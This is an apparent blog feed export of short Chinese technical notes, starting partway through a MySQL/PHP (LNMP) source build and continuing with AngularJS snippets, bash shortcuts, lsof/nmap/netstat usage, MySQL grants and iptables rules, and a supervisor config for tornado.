-DCMAKE_BUILD_TYPE:STRING=Release -DMYSQL_USER=mysql -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_DATADIR=/data/mysql -DSYSCONFDIR=/etc -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 -DWITH_ARCHIVE_STORAGE_ENGINE=1 -DWITH_BLACKHOLE_STORAGE_ENGINE=1 -DWITH_FEDERATED_STORAGE_ENGINE=1 -DWITH_PARTITION_STORAGE_ENGINE=1 -DWITH_READLINE=1 -DMYSQL_UNIX_ADDR=/data/mysql/mysql.sock -DMYSQL_TCP_PORT=3306 -DENABLED_LOCAL_INFILE=1 -DWITH_PARTITION_STORAGE_ENGINE=1 -DEXTRA_CHARSETS=all -DWITH_SSL=yes -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DDOWNLOAD_BOOST=1 -DWITH_BOOST=/usr/local/boost</span><br><span class="line">make &amp;&amp; make install  ＃ 30分钟...</span><br><span class="line">cp support-files/mysql.server /etc/init.d/mysqld</span><br><span class="line">chmod 755 /etc/init.d/mysqld</span><br><span class="line">groupadd mysql</span><br><span class="line">useradd mysql -g mysql -M -s /sbin/nologin</span><br><span class="line">mkdir /data/mysql</span><br><span class="line">chown mysql:mysql /data/mysql</span><br><span class="line">cd /usr/local/mysql</span><br><span class="line">cp support-files/my-default.cnf /etc/my.cnf</span><br><span class="line">/usr/local/mysql/bin/mysqld --initialize –user=mysql</span><br><span class="line">/etc/init.d/mysqld start</span><br><span class="line"></span><br><span class="line"># 线上镜像 docker pull ningmo/centos_lnmp:v1</span><br><span class="line"></span><br><span class="line"># php</span><br><span class="line">wget http://cn2.php.net/get/php-7.0.7.tar.gz/from/this/mirror</span><br><span class="line">tar zxvf mirror </span><br><span class="line">cd php-7.0.7</span><br><span class="line">yum install libxml2-devel libcurl-devel libjpeg-devel libpng-devel freetype-devel openldap-devel libmcrypt-devel -y</span><br><span class="line">cp -frp /usr/lib64/libldap* /usr/lib</span><br><span class="line">ln -s /usr/local/mysql/lib/libmysqlclient.so.18 /usr/lib</span><br><span class="line">ldconfig</span><br><span class="line">./configure --enable-fpm --enable-cgi --prefix=/usr/local/php --with-mysql=/usr/local/mysql/ --with-iconv-dir=/usr/local --with-freetype-dir --with-jpeg-dir=/usr/lib --with-png-dir=/usr/lib --with-zlib --with-libxml-dir=/usr --enable-xml --disable-rpath --enable-bcmath --enable-shmop --enable-sysvsem --with-curl --enable-mbregex --enable-mbstring --with-gd --enable-gd-native-ttf --with-openssl --with-mhash --enable-pcntl --with-ldap --with-ldap-sasl --with-xmlrpc --enable-zip --enable-soap --with-mysqli=/usr/local/mysql/bin/mysql_config --with-pdo-mysql=/usr/local/mysql --enable-opcache=no</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">cp php.ini-production /usr/local/php/lib/php.ini -f</span><br><span class="line">cp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm  -f</span><br><span class="line">chmod u+x /etc/init.d/php-fpm </span><br><span class="line">cd /usr/local/php/etc/</span><br><span class="line">cp php-fpm.conf.default php-fpm.conf   -f</span><br><span class="line">sed -i  &apos;s/nobody/www/g&apos;  /usr/local/php/etc/php-fpm.conf</span><br><span class="line">mkdir /data/www</span><br><span class="line">echo &quot;&lt;?php phpinfo();&quot; &gt;/data/www/index.php</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> linux </tag>
            
            <tag> centos </tag>
            
            <tag> lnmp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>终端使用proxy</title>
      <link href="/2016/05/16/linux/%E7%BB%88%E7%AB%AF%E4%BD%BF%E7%94%A8proxy/"/>
      <url>/2016/05/16/linux/%E7%BB%88%E7%AB%AF%E4%BD%BF%E7%94%A8proxy/</url>
      
        <content type="html"><![CDATA[<p>最简单的方法是 执行</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">http_proxy</span>=http://127.0.0.1:8087</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">https_proxy</span>=http://127.0.0.1:8087</span><br></pre></td></tr></table></figure><p>(以上将http https协议代理到本地的8087端口 且只对当前终端窗口有效)<br>支持写法 <code>http_proxy=http://userName:password@proxyAddress:port</code></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angularjs ng-repeat checkbox</title>
      <link href="/2016/03/03/js/angularjs%20ng-repeat%20checkbox/"/>
      <url>/2016/03/03/js/angularjs%20ng-repeat%20checkbox/</url>
      
        <content type="html"><![CDATA[<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">"col-md-3"</span> ng-repeat=<span class="string">"user in title.UserList"</span>&gt;</span><br><span class="line">    &lt;p <span class="keyword">class</span>=<span class="string">"form-control-static"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"checkbox"</span> ng-<span class="keyword">checked</span>=<span class="string">"user.Role"</span> ng-model=<span class="string">"item.UserId[user.UserId]"</span> ng-<span class="literal">true</span>-<span class="keyword">value</span>=<span class="string">"'add_&#123;&#123;user.UserId&#125;&#125;'"</span> ng-<span class="literal">false</span>-<span class="keyword">value</span>=<span class="string">"'del_&#123;&#123;user.UserId&#125;&#125;'"</span>/&gt;&amp;nbsp;&#123;&#123;user.UserName&#125;&#125;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> angularjs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nohup/disown/setsid/screen</title>
      <link href="/2015/12/15/linux/linux%E7%9A%84nohup%20disown%20setsid%20screen/"/>
      <url>/2015/12/15/linux/linux%E7%9A%84nohup%20disown%20setsid%20screen/</url>
      
        <content type="html"><![CDATA[<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">nohup 可以将进程挂起 帐号退出时不受影响</span><br><span class="line">    nohup cp -r a b/ [&gt;/~/cp.log] &amp;  </span><br><span class="line">setsid 作用类似于nohup</span><br><span class="line">    swtsid cp -r a b/</span><br><span class="line">disown 使已经在运行的用户进程 不受用户退出限制</span><br><span class="line">    disown -h %1  # 1 为jobsID </span><br><span class="line">    如果已经在当前终端运行 </span><br><span class="line">        可以ctrl+z 挂起 </span><br><span class="line">        bg jobsID 放入后台</span><br><span class="line">        disown -h jobsID </span><br><span class="line"></span><br><span class="line">screen 适用于多条命令</span><br><span class="line"></span><br><span class="line">jobsID 可以通过jobs命令显示</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>angularjs同步请求</title>
      <link href="/2015/12/15/js/angularjs%20%20%E5%90%8C%E6%AD%A5%E8%AF%B7%E6%B1%82/"/>
      <url>/2015/12/15/js/angularjs%20%20%E5%90%8C%E6%AD%A5%E8%AF%B7%E6%B1%82/</url>
      
        <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">    .service(<span class="string">'Syncservice'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">var</span> request;</span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">               request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject) &#123;</span><br><span class="line">               request = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Your browser don't support XMLHttpRequest"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           request.open(<span class="string">'GET'</span>, url, <span class="literal">false</span>);</span><br><span class="line">           request.send(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (request.status === <span class="number">200</span>) &#123;</span><br><span class="line">               <span class="keyword">return</span> request.responseText;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> &#123;</span><br><span class="line">           fetch: fetch</span><br><span class="line">       &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>调用</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">var data</span> = Syncservice.fetch(<span class="string">'/api/data/'</span>+i);</span><br></pre></td></tr></table></figure><p>当然 以上同步请求会阻断当前页面 在console中警告<br>​<figure class="highlight plain"><figcaption><span>XMLHttpRequest on the main thread is deprecated because of its detrimental effects to the end user's experience. For more help, check</span><a href="http://xhr.spec.whatwg.org/" target="_blank" rel="noopener">```</a></figcaption><table><tr><td class="code"><pre><span class="line">意思就是在js的主进程中调用同步请求影响用户体验，可以使用worker进程进行同步请求 这样会有较好的用户体验 具体使用方法请自行google之</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> angularjs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php7 configure</title>
      <link href="/2015/12/11/php/php7%20configure/"/>
      <url>/2015/12/11/php/php7%20configure/</url>
      
        <content type="html"><![CDATA[<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="literal">-</span><span class="literal">-</span><span class="comment">prefix=/usr/local/php7</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">config</span><span class="literal">-</span><span class="comment">file</span><span class="literal">-</span><span class="comment">path=/usr/local/php7/etc</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">fpm</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">fpm</span><span class="literal">-</span><span class="comment">user=www</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">fpm</span><span class="literal">-</span><span class="comment">group=www</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">mysqli=/usr/local/mysql/bin/mysql_config</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">pdo</span><span class="literal">-</span><span class="comment">mysql=/usr/local/mysql/bin/mysql_config</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">iconv</span><span class="literal">-</span><span class="comment">dir=/usr/local</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">freetype</span><span class="literal">-</span><span class="comment">dir</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">jpeg</span><span class="literal">-</span><span class="comment">dir=/usr/lib</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">png</span><span class="literal">-</span><span class="comment">dir=/usr/lib</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">zlib</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">libxml</span><span class="literal">-</span><span class="comment">dir=/usr</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">xml</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">disable</span><span class="literal">-</span><span class="comment">rpath</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">bcmath</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">shmop</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">sysvsem</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">inline</span><span class="literal">-</span><span class="comment">optimization</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">curl</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">mbregex</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">mbstring</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">mcrypt</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">ftp</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">gd</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">gd</span><span class="literal">-</span><span class="comment">native</span><span class="literal">-</span><span class="comment">ttf</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">openssl</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">mhash</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">pcntl</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">sockets</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">xmlrpc</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">zip</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">soap</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">without</span><span class="literal">-</span><span class="comment">pear</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">gettext</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">disable</span><span class="literal">-</span><span class="comment">fileinfo</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enable</span><span class="literal">-</span><span class="comment">maintainer</span><span class="literal">-</span><span class="comment">zts</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux bash下 快捷键</title>
      <link href="/2015/12/02/linux/linux%20bash%E4%B8%8B%20%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
      <url>/2015/12/02/linux/linux%20bash%E4%B8%8B%20%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
      
        <content type="html"><![CDATA[<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">c + <span class="keyword">a</span>    <span class="comment"># 光标跳转到最左</span></span><br><span class="line">c + e    <span class="comment"># 光标跳转到最后</span></span><br><span class="line">c + w    <span class="comment"># 删除最后输入的单词</span></span><br><span class="line">c + u    <span class="comment"># 删除整行</span></span><br><span class="line">c + k    <span class="comment"># 删除光标到末尾</span></span><br><span class="line">c + l    <span class="comment"># 清屏</span></span><br><span class="line"></span><br><span class="line">c + z    <span class="comment"># 挂起当前进程至后台</span></span><br><span class="line">         <span class="comment"># jobs 查看挂起(相当与暂停)的进程</span></span><br><span class="line">         <span class="comment"># fg jobsId 切换至进程</span></span><br><span class="line">         <span class="comment"># bg jobsId 将挂起的进程 放至后台继续运行</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>lsof/nmap/netstat</title>
      <link href="/2015/12/02/linux/linux%20lsof%20nmap%20netstat/"/>
      <url>/2015/12/02/linux/linux%20lsof%20nmap%20netstat/</url>
      
        <content type="html"><![CDATA[<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">lsof</span> -i :<span class="number">22</span>    <span class="comment"># 显示22端口当前运行的程序</span></span><br><span class="line"></span><br><span class="line">lsof -c ssh  <span class="comment"># 显示ssh进程打开的文件</span></span><br><span class="line"></span><br><span class="line">lsof -p <span class="number">2120</span>  <span class="comment">#显示进程id2120打开的文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nmap -sP  <span class="number">192.168.1.0</span>/<span class="number">24</span>  <span class="comment">#查看192.168.1.0/24有几个用户连接至本机</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">netstat -tunl <span class="comment">#显示正在监听的网络服务端口</span></span><br><span class="line"></span><br><span class="line">netstat -tun <span class="comment">#显示已连接的网络服务端口</span></span><br><span class="line"></span><br><span class="line">lsusb  <span class="comment"># 显示usb设备</span></span><br><span class="line">lspic  <span class="comment"># 显示pci设备</span></span><br><span class="line"></span><br><span class="line">tar zxvf  abc.tar.gz -C /your/path  <span class="comment">#解压文件到指定目录</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netstat </tag>
            
            <tag> lsof </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 上不去网</title>
      <link href="/2015/12/02/linux/linux%20%E4%B8%8A%E4%B8%8D%E5%8E%BB%E7%BD%91/"/>
      <url>/2015/12/02/linux/linux%20%E4%B8%8A%E4%B8%8D%E5%8E%BB%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<p>linux 上不去网   ip dns无误 ping可以到达网关</p><p>可能原因 网卡睡眠</p><p>ethtool eht0  //查看eht0网口基本设置</p><p>mii-tool -w eth0</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xsl输出html代码 非闭合</title>
      <link href="/2015/11/26/php/xsl%E8%BE%93%E5%87%BAhtml%E4%BB%A3%E7%A0%81%20%E9%9D%9E%E9%97%AD%E5%90%88/"/>
      <url>/2015/11/26/php/xsl%E8%BE%93%E5%87%BAhtml%E4%BB%A3%E7%A0%81%20%E9%9D%9E%E9%97%AD%E5%90%88/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;xsl:text disable-output-escaping=&quot;yes&quot;&gt;&amp;lt;/div&amp;gt; &amp;lt;div class=&quot;row-fluid&quot;&amp;gt;&lt;/xsl:text&gt;···</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>msql 按值排序</title>
      <link href="/2015/11/26/mysql/msql%20%E6%8C%89%E5%80%BC%E6%8E%92%E5%BA%8F/"/>
      <url>/2015/11/26/mysql/msql%20%E6%8C%89%E5%80%BC%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">ORDER BY find_in_set(status,'<span class="number">705</span>,<span class="number">710</span>,<span class="number">706</span>,<span class="number">1027</span>,<span class="number">707</span>,<span class="number">709</span>,<span class="number">708</span>'),create_time desc</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS获取图片上传地址</title>
      <link href="/2015/11/26/js/JS%E8%8E%B7%E5%8F%96%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0%E5%9C%B0%E5%9D%80/"/>
      <url>/2015/11/26/js/JS%E8%8E%B7%E5%8F%96%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<figure class="highlight qml"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getObjectURL</span>(<span class="params">file</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">url</span> = <span class="literal">null</span> ;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.createObjectURL!=<span class="literal">undefined</span>) &#123; <span class="comment">// basic</span></span><br><span class="line">        <span class="built_in">url</span> = <span class="built_in">window</span>.createObjectURL(file) ;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.URL!=<span class="literal">undefined</span>) &#123; <span class="comment">// mozilla(firefox)</span></span><br><span class="line">        <span class="built_in">url</span> = <span class="built_in">window</span>.URL.createObjectURL(file) ;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.webkitURL!=<span class="literal">undefined</span>) &#123; <span class="comment">// webkit or chrome</span></span><br><span class="line">        <span class="built_in">url</span> = <span class="built_in">window</span>.webkitURL.createObjectURL(file) ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">url</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql优化的几个方面</title>
      <link href="/2015/11/26/mysql/%E4%BC%98%E5%8C%96%E4%BB%8E%E5%87%A0%E4%B8%AA%E6%96%B9%E9%9D%A2%E6%9D%A5%E8%AF%B4/"/>
      <url>/2015/11/26/mysql/%E4%BC%98%E5%8C%96%E4%BB%8E%E5%87%A0%E4%B8%AA%E6%96%B9%E9%9D%A2%E6%9D%A5%E8%AF%B4/</url>
      
        <content type="html"><![CDATA[<h5 id="优化从几个方面来说"><a href="#优化从几个方面来说" class="headerlink" title="优化从几个方面来说"></a>优化从几个方面来说</h5><h5 id="表结构设计"><a href="#表结构设计" class="headerlink" title="表结构设计"></a>表结构设计</h5><h5 id="适当索引（主键-普通-唯一-全文组合）"><a href="#适当索引（主键-普通-唯一-全文组合）" class="headerlink" title="适当索引（主键 普通 唯一 全文组合）"></a>适当索引（主键 普通 唯一 全文组合）</h5><h5 id="mysql本身配置"><a href="#mysql本身配置" class="headerlink" title="mysql本身配置"></a>mysql本身配置</h5><h5 id="硬件配置"><a href="#硬件配置" class="headerlink" title="硬件配置"></a>硬件配置</h5><h5 id="SQL语句优化-存储过程"><a href="#SQL语句优化-存储过程" class="headerlink" title="SQL语句优化 存储过程"></a>SQL语句优化 存储过程</h5><h5 id="分表-分区"><a href="#分表-分区" class="headerlink" title="分表 分区"></a>分表 分区</h5><h5 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h5><h5 id="清理垃圾数据"><a href="#清理垃圾数据" class="headerlink" title="清理垃圾数据"></a>清理垃圾数据</h5>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql查看状态语句</title>
      <link href="/2015/11/26/mysql/mysql%E6%9F%A5%E7%9C%8B%E7%8A%B6%E6%80%81%E8%AF%AD%E5%8F%A5/"/>
      <url>/2015/11/26/mysql/mysql%E6%9F%A5%E7%9C%8B%E7%8A%B6%E6%80%81%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<p><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">status</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> [<span class="keyword">session</span>|<span class="keyword">global</span>] <span class="keyword">status</span> <span class="keyword">like</span> <span class="string">'com_insert|com_update...'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">status</span> <span class="keyword">like</span> <span class="string">'connerctions'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">status</span> <span class="keyword">like</span> <span class="string">'slow_queries'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'long_query_time'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--开启慢查询日志 启动参数</span></span><br><span class="line"></span><br><span class="line">mysqld  <span class="comment">--safemode --slow-query-log</span></span><br><span class="line"></span><br><span class="line">或者 mysqld -log-slow-queries=d/abc.log</span><br></pre></td></tr></table></figure></code></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux mysql 授权以及 iptables开启3306</title>
      <link href="/2015/11/25/linux/linux%20mysql%20%E6%8E%88%E6%9D%83%E4%BB%A5%E5%8F%8A%20iptables%E5%BC%80%E5%90%AF3306/"/>
      <url>/2015/11/25/linux/linux%20mysql%20%E6%8E%88%E6%9D%83%E4%BB%A5%E5%8F%8A%20iptables%E5%BC%80%E5%90%AF3306/</url>
      
        <content type="html"><![CDATA[<p>mysql授权ip段访问mysql</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="string">'yang'</span>@<span class="string">'192.168.1.%'</span> <span class="keyword">identified</span>  <span class="keyword">by</span> <span class="string">'123456'</span>;</span><br></pre></td></tr></table></figure><p>linux iptables开启3306端口 访问</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp -s <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span>  --dport <span class="number">3306</span> -j ACCEPT</span><br><span class="line">/etc/init.d/iptables save</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>supervisor tornado 多进程多端口配置</title>
      <link href="/2015/11/24/python/supervisor%20tornado%20%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%9A%E7%AB%AF%E5%8F%A3%E9%85%8D%E7%BD%AE/"/>
      <url>/2015/11/24/python/supervisor%20tornado%20%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%9A%E7%AB%AF%E5%8F%A3%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>base： nginx tornado<br>目标： tornado 实现多端口多进程运行</p><p>pip install supervisor<br>echo_supervisord_conf &gt; /etc/supervisord.conf   # 默认echo_supervisord_conf 在python/bin 目录下<br>配置/etc/supervisord.conf</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[program:app]</span><br><span class="line"><span class="attribute">command</span>=python /data/www/app/app.py <span class="attribute">--port</span>=600%(process_num)d</span><br><span class="line"><span class="attribute">process_name</span>=%(program_name)s%(process_num)d</span><br><span class="line"><span class="attribute">numprocs</span>=6         ; 开启6个子进程</span><br><span class="line"><span class="attribute">numprocs_start</span>=1   ; 上面的process_num从1开始  </span><br><span class="line"><span class="attribute">directory</span>=/data/www/app</span><br><span class="line"><span class="attribute">autostart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attribute">autorestart</span>=<span class="literal">false</span></span><br><span class="line">;<span class="attribute">startsecs</span>=5                   ; number of secs prog must stay running (def. 1)</span><br><span class="line"><span class="attribute">startretries</span>=3                ; max # of serial start failures (default 3)</span><br><span class="line">;<span class="attribute">stopsignal</span>=QUIT               ; signal used <span class="keyword">to</span> kill process (default TERM)</span><br><span class="line">;<span class="attribute">stopwaitsecs</span>=10               ; max num secs <span class="keyword">to</span> wait b4 SIGKILL (default 10)</span><br><span class="line">;<span class="attribute">stopasgroup</span>=<span class="literal">false</span>             ; send stop signal <span class="keyword">to</span> the UNIX process<span class="built_in"> group </span>(default <span class="literal">false</span>)</span><br><span class="line">;<span class="attribute">killasgroup</span>=<span class="literal">false</span>             ; SIGKILL the UNIX process<span class="built_in"> group </span>(def <span class="literal">false</span>)</span><br><span class="line"><span class="attribute">user</span>=root                   ; setuid <span class="keyword">to</span> this UNIX account <span class="keyword">to</span> <span class="builtin-name">run</span> the program</span><br><span class="line"><span class="attribute">redirect_stderr</span>=<span class="literal">true</span>          ; redirect proc stderr <span class="keyword">to</span> stdout (default <span class="literal">false</span>)</span><br><span class="line"><span class="attribute">stdout_logfile</span>=/data/logs/supervisor/order.log        ; stdout log path, NONE <span class="keyword">for</span> none;<span class="built_in"> default </span>AUTO</span><br><span class="line"><span class="attribute">stderr_logfile</span>=/data/logs/supervisor/order_error.log        ; stderr log path, NONE <span class="keyword">for</span> none;<span class="built_in"> default </span>AUTO</span><br><span class="line">;<span class="attribute">serverurl</span>=AUTO                ; override serverurl computation (childutils)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> supervisor </tag>
            
            <tag> tornado </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openwrt chinadns</title>
      <link href="/2015/11/22/linux/openwrt%20chinadns/"/>
      <url>/2015/11/22/linux/openwrt%20chinadns/</url>
      
